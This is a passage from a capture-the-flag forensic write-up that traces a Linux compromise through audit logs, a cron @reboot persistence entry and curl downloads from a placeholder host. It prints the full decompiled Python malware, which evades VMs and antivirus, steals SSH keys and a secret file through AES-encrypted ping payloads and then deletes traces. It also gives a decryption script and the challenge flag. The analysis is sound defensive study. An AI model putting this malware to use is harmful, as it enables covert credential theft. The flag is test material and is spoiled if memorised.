+<p>We start by examining the audit logs to identify the use of known download tools. Using these commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ausearch -x /usr/bin/curl
+</span></span><span class="line"><span class="cl">sudo grep -E <span class="s1">&#39;sudo|python3.7|pip|wget|curl&#39;</span> /var/log/audit/audit.log
+</span></span></code></pre></div><p>We get the following results:</p>
+<pre tabindex="0"><code>type=EXECVE msg=audit(1742907868.476:1044): argc=2 a0=&#34;curl&#34; a1=&#34;http://vastation.null:8080/install_nptdate.sh&#34;
+type=EXECVE msg=audit(1742907868.920:1175): argc=5 a0=&#34;curl&#34; a1=&#34;-fsSL&#34; a2=&#34;http://vastation.null:8080/ntpdate_util.cpython-37.pyc&#34; a3=&#34;-o&#34; a4=&#34;/opt/fJQsJUNS/.sys&#34;
+</code></pre><p>This shows that two files have been downloaded from <strong><a href="http://vastation.null:8080" target="_blank" rel="noopener noreffer ">http://vastation.null:8080</a></strong>: a shell script and a .pyc file (Python bytecode) saved in <strong>/opt/fJQsJUNS/.sys</strong>.</p>
+<p>Once this has been done, we can explore the <strong>/opt</strong> directory:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find /opt -type f
+</span></span><span class="line"><span class="cl">ls ~/.local/lib/python3.7/site-packages/
+</span></span></code></pre></div><pre tabindex="0"><code>/opt/.e977vo.log
+/opt/.nxpmnh.log
+/opt/.0ukt0x.dat
+/opt/.3i8tft.log
+/opt/.fe3wuo.dat
+/opt/.8y3ka9.sh
+/opt/.2v0gpt.log
+/opt/.vwkw39.dat
+/opt/fJQsJUNS/.rdme
+/opt/fJQsJUNS/.sys
+/opt/.y1q3da.log
+/opt/.0tsxsh.sh
+</code></pre><p>There are several .log, .dat, and .sh files - typical of a malware installation or hiding environment. The <strong>.sys</strong> file in <strong>/opt/fJQsJUNS/</strong> is particularly suspicious, and indeed is the one we identified earlier.</p>
+<p>A common method of persistence for malware is to use cron. We check the cron files:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ausearch -f /etc/cron.d/
+</span></span><span class="line"><span class="cl">ls -la /etc/cron.d/
+</span></span></code></pre></div><p>Which gives us:</p>
+<pre tabindex="0"><code>@reboot root PYTHONPATH=/home/johndoe/.local/lib/python3.7/site-packages python3.7 /opt/fJQsJUNS/.sys &amp;
+</code></pre><p>This confirms that the malicious file <strong>/opt/fJQsJUNS/.sys</strong> is executed at every boot, ensuring the malware&rsquo;s persistence.We explore the relevant folder:</p>
+<pre tabindex="0"><code>cd /opt/fJQsJUNS/
+file .sys
+</code></pre><p>The file is indeed a python compiled bytecode. In order to analyse the behaviour of this program, we can decompile it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mv .sys malware.pyc
+</span></span><span class="line"><span class="cl">decompyle3 malware.pyc &gt; reversed.py
+</span></span></code></pre></div><p>The <code>reversed.py</code> file contains python source code, allowing us to read its features. Here is the full source code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">subprocess</span><span class="o">,</span> <span class="nn">psutil</span><span class="o">,</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">__k</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">__v</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;1f2d3c4b5a69788766554433221100ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">__d</span> <span class="o">=</span> <span class="s2">&#34;37e0f8f92c71f1c3f047f43c13725ef1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__b64d</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">])</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__u</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">x</span><span class="p">[:</span><span class="o">-</span><span class="n">x</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__x</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">__k</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">__v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">__u</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">h</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__y</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">__k</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">__v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">c</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">__p</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__chk_vm</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">z</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/sys/class/dmi/id/product_name&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">q</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;VmlydHVhbEJveA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;S1ZN&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;UVFNVQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Qm9jaHM=&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">z</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERR VM&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__chk_av</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">targets</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Y2xhbWQ=&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;YXZnZA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;c29waG9z&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;RVNFVA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cmtodW50ZXI=&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">psutil</span><span class="o">.</span><span class="n">process_iter</span><span class="p">(</span><span class="n">attrs</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="ow">or</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">b64av</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64av</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">n</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERR AV&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__exf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">15</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span> <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">segs</span> <span class="o">=</span> <span class="p">[</span><span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">size</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">size</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">seg</span> <span class="ow">in</span> <span class="n">segs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">__k</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">__v</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">__p</span><span class="p">(</span><span class="n">seg</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="n">__b64d</span><span class="p">(</span><span class="s2">&#34;cGluZw==&#34;</span><span class="p">),</span> <span class="n">__b64d</span><span class="p">(</span><span class="s2">&#34;LWM=&#34;</span><span class="p">),</span> <span class="n">__b64d</span><span class="p">(</span><span class="s2">&#34;MQ==&#34;</span><span class="p">),</span> <span class="n">__b64d</span><span class="p">(</span><span class="s2">&#34;LXA=&#34;</span><span class="p">),</span> <span class="n">payload</span><span class="p">,</span> <span class="n">dst</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">__main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">__chk_vm</span><span class="p">():</span> <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">__chk_av</span><span class="p">():</span> <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__kll</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">           <span class="s2">&#34;/root/.secret&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s2">&#34;~/.ssh/id_rsa&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">           <span class="s2">&#34;/root/.ssh/id_rsa&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">       <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">__kll</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">__exf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">__x</span><span class="p">(</span><span class="n">__d</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">_kkoo</span> <span class="o">=</span> <span class="s2">&#34;/root/.secret&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">_kkoo</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">_kkoo</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__main</span><span class="p">()</span>
+</span></span></code></pre></div><p>The Python malware performs anti-VM and anti-antivirus checks, exfiltrates sensitive files (SSH keys, secret files) via encrypted ping commands, then attempts to remove its traces.</p>
+<p>To sum up its behaviour, it is as follows:</p>
+<ol>
+<li>Avoids analysis (anti-VM/AV)</li>
+<li>Theft and encryption of sensitive data</li>
+<li>Exfiltration via ping</li>
+<li>Clean up your tracks</li>
+</ol>
+<p>Now, using the pcap file, the AES key and the IV, we need to find the exfiltrated files. The malware exfiltrates the data via ICMP packets (ping), encoding the encrypted blocks in the data field. The algorithm used is AES-CBC with a static key and IV, padding PKCS#7.</p>
+<p>We start by extracting the ICMP echo request packets (type 8):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tshark -r capture.pcap -Y <span class="s2">&#34;icmp.type == 8&#34;</span> -T fields -e data &gt; icmp_payloads.txt
+</span></span></code></pre></div><p>We can build the following script in order to get, decrypt and rebuild the files.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">IV</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;1f2d3c4b5a69788766554433221100ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We remove the first 16 hex characters (8 bytes) from each line.</span>
+</span></span><span class="line"><span class="cl"><span class="n">PREFIX_LENGTH</span> <span class="o">=</span> <span class="mi">16</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Then we take the next 32 hex characters, which is one AES block (16 bytes).</span>
+</span></span><span class="line"><span class="cl"><span class="n">CIPHERTEXT_LENGTH</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Remove PKCS#7 padding.&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pad_len</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pad_len</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">pad_len</span> <span class="o">&gt;</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Invalid padding encountered.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">pad_len</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_block</span><span class="p">(</span><span class="n">hex_cipher</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Decrypt a 16-byte (32 hex characters) ciphertext block using AES-CBC.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    The block is assumed to be the result of encrypting a chunk with PKCS#7 padding.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ct</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_cipher</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Usage: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;icmp_payloads.txt&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="n">payloads_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">payloads_file</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error reading payload file: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">recovered_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">PREFIX_LENGTH</span> <span class="o">+</span> <span class="n">CIPHERTEXT_LENGTH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> is too short, skipping.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Remove the first 16 hex characters and extract the next 32 hex characters.</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_cipher</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">PREFIX_LENGTH</span><span class="p">:</span> <span class="n">PREFIX_LENGTH</span> <span class="o">+</span> <span class="n">CIPHERTEXT_LENGTH</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">decrypt_block</span><span class="p">(</span><span class="n">hex_cipher</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">recovered_data</span> <span class="o">+=</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error decrypting block on line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">    <span class="n">output_file</span> <span class="o">=</span> <span class="s2">&#34;recovered_file&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">recovered_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Recovered file written to &#39;</span><span class="si">{</span><span class="n">output_file</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error writing recovered file: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>This script parses each ICMP payload line, trims off the first 8 bytes (16 hex characters), and decrypts the next 16 bytes (32 hex characters) using AES-CBC. The decrypted result is then concatenated and saved to <code>recovered_file</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image34.png"
+        data-srcset="/assets/images/writeups/dgse/image34.png, /assets/images/writeups/dgse/image34.png 1.5x, /assets/images/writeups/dgse/image34.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image34.png"
+        title="script_execution" /></p>
+<ul>
+<li><strong>RM{723fa42601aaadcec097773997735895fb486be7}</strong></li>
